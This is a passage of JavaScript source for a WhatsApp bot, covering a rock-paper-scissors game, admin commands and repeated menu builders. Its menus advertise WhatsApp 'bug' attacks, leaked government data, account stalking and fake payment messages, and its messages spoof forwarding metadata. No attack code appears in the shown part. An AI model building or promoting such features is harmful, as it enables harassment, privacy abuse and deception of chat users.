            ArielStore.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    ArielStore.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ArielStore.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ArielStore.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) ArielStore.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ArielStore.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ArielStore.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    replygcaespisp(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) ArielStore.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    replygcaespisp(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) ArielStore.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ArielStore.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
aespispverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(aespispverifieduser, null, 2))
}
        
        switch (isCommand) {
        	case 'socialmedia': 
        case 'sosmed': 
        case 'update':{
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://youtube.com/@dgaespisp', // Command (URL in this case)
        'cta_url', // Button type
        'https://youtube.com/@dgaespisp' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'http://t.me/aespispbotinc', // Command (URL in this case)
        'cta_url', // Button type
        'http://t.me/aespispbotinc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Follow Developer On GitHub`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/DGaespisp', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/DGaespisp' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
        '', // Title
        `Follow Developer On Instagram`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.instagram.com/unicorn_aespisp13', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.instagram.com/unicorn_aespisp13' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Contact Developer On WhatsApp`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/916909137213', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/916909137213' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: ArielStore.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await ArielStore.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
            case 'addbadword': case 'addbd':
               if (!aespispTheCreator) return aespispStickOwner()
               if (!groupAdmins) return replygcaespisp(mess.admin)
               if (args.length < 1) return replygcaespisp( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcaespisp('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!aespispTheCreator) return aespispStickOwner()
               if (!groupAdmins) return replygcaespisp(mess.admin)
               if (args.length < 1) return replygcaespisp( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcaespisp('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!aespispTheCreator) return aespispStickOwner()
               let totalusernya = db.data.users[0]
               replygcaespisp(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!aespispTheCreator) return aespispStickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               replygcaespisp(mess.done)
            }
            break
            case 'setmenu': {
            if (!aespispTheCreator) return aespispStickOwner()
            if (text.startsWith('v')) {
                  typemenu = text
                  replygcaespisp(mess.done)
               } else {
               let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT MENU 🗂️",
"sections":[{"title":"SELECT THE MENU BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"BUTTON + CHANNEL V2",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL V2",
"id":"${prefix+command} v12"},
{"header":"BUTTON + CHANNEL",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL",
"id":"${prefix+command} v11"},
{"header":"ONLY BUTTON",
"title":"CHOOSE ",
"description":"ONLY BUTTON",
"id":"${prefix+command} v10"},
{"header":"CHANNEL + FAKE THUMBNAIL V2",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL V2",
"id":"${prefix+command} v9"},
{"header":"CHANNEL + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL",
"id":"${prefix+command} v8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"CHOOSE ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} v7"},
{"header":"FAKE PAYMENT",
"title":"CHOOSE ",
"description":"FAKE PAYMENT",
"id":"${prefix+command} v6"},
{"header":"CALL SCHEDULE",
"title":"CHOOSE",
"description":"CALL SCHEDULE",
"id":"${prefix+command} v5"},
{"header":"GIF THUMBNAIL",
"title":"CHOOSE",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} v4"},
{"header":"VIDEO THUMBNAIL",
"title":"CHOOSE",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"CHANNEL + THUMBNAIL",
"title":"CHOOSE",
"description":"CHANNEL + THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"IMAGE THUMBNAIL",
"title":"CHOOSE",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'setreply':{
               if (!aespispTheCreator) return aespispStickOwner()
               if (text.startsWith('v')) {
                  typereply = text
                  replygcaespisp(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT REPLY 🐛",
"sections":[{"title":"SELECT THE REPLY BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"CHANNEL + LINK THUMB",
"title":"CHOOSE ",
"description":"CHANNEL + LINK THUMB",
"id":"${prefix+command} v4"},
{"header":"LARGE LINK + THUMBNAIL",
"title":"CHOOSE ",
"description":"LARGE LINK + THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"LINK + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"LINK + FAKE THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"QUOTED NORMALLY",
"title":"CHOOSE ",
"description":"QUOTED NORMALLY",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'menu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi *${pushname}*\nKLICK BUTTON DIBAWAH BRO UNTUK MELIHAT *MENU*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"Aespi Botz [2072]",
"sections":[{"title":"ARIEL STORE [2072]",
"rows":[{"header":"OWNER MENU",
"title":"Aespi Botz",
"description":"MENU KHUSUS OWNER",
"id":"${prefix}ownermen"},
{"header":"SEARCH MENU",
"title":"Aespi Botz ",
"description":"TELUSURI SESUATU",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"Aespi Botz ",
"description":"DOWNLOAD MP4 & MP3",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"Aespi Botz ",
"description":"BERMAIN GAME",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"Aespi Botz ",
"description":"JUST FUN",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"Aespi Botz ",
"description":"AI CREATED",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"Aespi Botz ",
"description":"KHUSUS GROUP & ADMIN GROUP",
"id":"${prefix}groupmenu"},
{"header":"CONVERT MENU",
"title":"Aespi Botz ",
"description":"CREATED STIKER",
"id":"${prefix}convertmenu"},
{"header":"RELIGION MENU",
"title":"Aespi Botz ",
"description":"TRUST IN GOD",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"Aespi Botz ",
"description":"UNTUK PARA WIBU",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"Aespi Botz ",
"description":"Save wa.me/6282118022072",
"id":"${prefix}randomphotomenu"},
{"header":"STICKER MENU",
"title":"Aespi Botz ",
"description":"BIKIN STIKER GAN",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"Aespi Botz ",
"description":"DATA KOMINFO JEBOL",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"Aespi Botz ",
"description":"COCOK UNTUK ANAK JB",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"Aespi Botz ",
"description":"STALK AKUN DOI",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"Aespi Botz ",
"description":"GUNAKAN BUG WA DENGAN BIJAK",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"Aespi Botz ",
"description":"MENU KERAMAT",
"id":"${prefix}othermenu"},
{"header":"LIST MENU",
"title":"Aespi Botz ",
"description":"LIST PENTING",
"id":"${prefix}listmenu"}
]
}
]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"OWNER","id":"${prefix}owner"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'ownermen': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${arielownermenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'searchmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${searchmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'downloadmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${downloadmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'gamemenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${gamemenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'funmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${funmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'listmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${listmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'aimenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${aimenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'groupmenu': {
let msg = generateWAMessageFromContent(from, {
